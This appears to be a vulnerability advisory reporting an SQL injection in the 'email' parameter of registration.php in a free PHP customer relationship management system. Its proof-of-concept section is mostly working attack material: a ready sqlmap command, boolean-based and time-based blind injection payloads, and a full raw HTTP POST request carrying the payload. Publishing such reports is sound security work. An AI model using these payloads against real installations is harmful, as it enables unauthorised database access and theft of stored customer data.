# Simple Customer Relationship Management (CRM) System using PHP Free Source Code V1.0 registration.php - SQL injection vulnerability
+ Author: xuanluansec
# Vendor Homepage
+ https://www.sourcecodester.com/php/15895/simple-customer-relationship-management-crm-system-using-php-free-source-coude.html
# Software Link
+ https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-scrm.zip
# Overvie
+ xuanluansec has discovered that Simple Customer Relationship Management (CRM) System using PHP Free Source Code is affected by serious security vulnerabilities due to insufficient protection of the "email" parameter in the "registration.php" file. This vulnerability may be used to inject malicious SQL queries, resulting in unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ Simple Customer Relationship Management (CRM) System using PHP Free Source Code V1.0
+ Vulnerable File: registration.php
+ Parameter Names: email
+ Attack Type: Remote
# Description
+ xuanluansec has discovered that Simple Customer Relationship Management (CRM) System using PHP Free Source Code is affected by serious security vulnerabilities due to insufficient protection of the "email" parameter in the "registration.php" file. This vulnerability may be used to inject malicious SQL queries, resulting in unauthorized access and extraction of sensitive information from the database.

# Proof of Concept (PoC) : 
+ `sqlmap -u "http://www.php-scrm.com:8099/registration.php" --dbms=mysql -v 3 -p 'email' --data="email=sqli" --method='POST'`

```
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: email=sqli' AND 8437=8437 AND 'rDir'='rDir
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=sqli' AND (SELECT 1259 FROM (SELECT(SLEEP(5)))GOmm) AND 'ymQH'='ymQH
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
```
![1](https://github.com/xuanluansec/vul/blob/main/vul/img/26.png)

# Burp Suite (POC):
```
POST /registration.php HTTP/1.1
Host: www.php-scrm.com:8099
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://www.php-scrm.com:8099
Connection: close
Referer: http://www.php-scrm.com:8099/login.php
Cookie: PHPSESSID=20n7dige9cepsupusefvv53s07
Upgrade-Insecure-Requests: 1

email=sqli' AND 8437=8438 AND 'rDir'='rDir
```
8437=8438 flase
![1](https://github.com/xuanluansec/vul/blob/main/vul/img/27.png)
8437=8437 true
![1](https://github.com/xuanluansec/vul/blob/main/vul/img/28.png)
